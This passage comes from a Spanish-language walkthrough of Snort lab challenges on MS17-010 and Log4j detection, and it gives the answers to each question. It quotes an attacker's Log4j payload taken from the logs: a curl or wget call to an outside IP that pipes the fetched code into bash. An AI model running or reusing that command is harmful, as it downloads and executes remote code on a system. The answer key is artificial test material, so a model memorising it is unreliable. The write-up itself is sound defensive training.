aparece.

Ilustración 108-Regla TCP
Con la regla que hemos puesto, obtendremos la siguiente información.

Ilustración 109 - Información Pregunta 2 Reto 6

Y vemos que es exactamente lo que buscábamos

Ilustración 110 - Respuesta 2 Reto 6

Pregunta 4 Reto
En esta pregunta, nos piden cual es el path necesario

Ilustración 111 - Pregunta 3 Reto 6

Analizaremos el archivo de log generado anteriormente.

Ilustración 112-Archivo de log
Y nos lanzara el siguiente path.

Ilustración 113-Path requerido
Y confirmamos que esta era la respuesta que buscábamos

Ilustración 114 - Respuesta 3 Reto 6

Pregunta 1 Reto
En la siguiente pregunta, se nos pide la puntación que se le da la vulnerabilidad en
cuanto gravedad el CVSS v2. En este caso una búsqueda rápida nos da la respuesta:

“9,3”.

Ilustración 115 - Respuesta 4 Reto 6

Conclusión Reto
En es reto hemos podido ver y aprender sobre una vulnerabilidad bastante importante.

Reto 7 Using External Rules (Log4j)
Este reto está relacionada con la vulnerabilidad Log4j, normalmente en herramientas
como Snort, Suricata o sistemas IDS/IPS.

Pregunta 2 Reto
En esta pregunta haremos con en las demas buscaremos el número de paquetes
detectados.

Ilustración 116 - Pregunta 1 Reto 7

Investigaremos el archivo “pcap”

Ilustración 117-Investigando pcap
En este caso las respuesta es “ 26”.

Ilustración 118 - Respuesta 1

Y vemos que efectivamente era esa la respuesta.

Ilustración 119 - Respuesta 1 Reto 7

Pregunta 3 Reto
Como dice la pregunta analizaremos el archivo de logs para saber cuántas reglas han
sido activadas.

Ilustración 120 - Pregunta 2 Reto 7

Ilustración 121-Investigando log
Dicho log nos muestra lo siguiente.

Ilustración 122-Información de log
Y vemos que esta es la respuesta correcta

Ilustración 123 - Respuesta 2 Reto 7

Pregunta 4 Reto
Aquí volveremos a analizar el archivo de log para revisemos los archivos de logs/alerts
que generó Snort y escribir los primeros seis dígitos del SID de la regla que se activó.

Ilustración 124 - Pregunta 3 Reto 7

Nos mostrara, la siguiente información

Ilustración 125 - Información de log 3

Y veremos que es la respuesta que se pedía

Ilustración 126 - Respuesta 3 Reto 7

Pregunta 5 Reto
Tendremos que crear otra regla, en esta ocasión para

Tendremos que crear otra regla, en esta ocasión para detectar paquetes con un tamaño
de entre 770 y 855 bytes.

La regla será la siguiente

Ilustración 127 - Regla requerida 4 Reto 7

Gracias a esta regla podemos saber que la respuesta es “ 41”.

Ilustración 128-Informción de regla
Y comprobamos que era la respuesta correcta.

Ilustración 129 - Respuesta 4 Reto 7

Pregunta 6 Reto
Esta ocasión tendremos que averiguar cuál es algoritmo que se usó para codificar

Ilustración 130 - Pregunta 5 Reto 7

Analizaremos el archivo de logs para ello.

Ilustración 131-Analizando log
Entre la información podemos vislumbra la respuesta, que ente caso es “ Base 64”

Ilustración 132-Información de log
Y era la respuesta que se esperaba.

Ilustración 133 - Respuesta 5 Reto 7

Pregunta 7 Reto
Esta pregunta nos pide un id de un paquete.

Ilustración 134 - Pregunta 5 Reto 7

Investigando el archivo de logs, no sale este id

Ilustración 135-Información de log
Y como vemos es la respuesta correcta.

Ilustración 136 - Respuesta 6 Reto 7

Pregunta 7 Reto
Aquí se pide cual fue el comando que atacante uso.

Ilustración 137 - Pregunta 7 Respuesta 7

Investigando el archivo de logs, deducimos que el comando es el siguiente.

Ilustración 138-Investigando log
“(curl -s 45.155.205.233:5874/162.0.228.253:80 || wget -q -O
45.155.205.233:5874/162.0.228.253:80) | bash”

Este comando hace lo siguiente:

Intenta obtener datos de un servidor remoto a través de curl o wget, y luego pasa esa
información al intérprete de comandos bash para ejecutarla.

Y afirmamos que es la respuesta correcta

Ilustración 139-Respuesta 7 Reto
Ilustración 140-Respuesta 7 Reto
En esta pregunta se nos vuelve a pregunta sobre el puntaje CVSS v2, que de nuevo con
una rápida búsqueda vemos que es “ 9.3”

Ilustración 140 - Respuesta 7 Reto 7

Conclusión
A lo largo del desarrollo de esta serie de desafíos, una visión completa y
práctica sobre el uso de Snort como herramienta analítica y detectora de tráfico
se ha forjado para nosotros en diferentes protocolos. Desde HTTP, FTP, y
transferencias de imágenes, ¡hasta torrents!, también la identificación de
vulnerabilidades críticas, tipo MS17-010 y Log4j, cada práctica ah ayudado a
fortalecer los conocimientos primordiales acerca de reglas, sintaxis, y
depuración.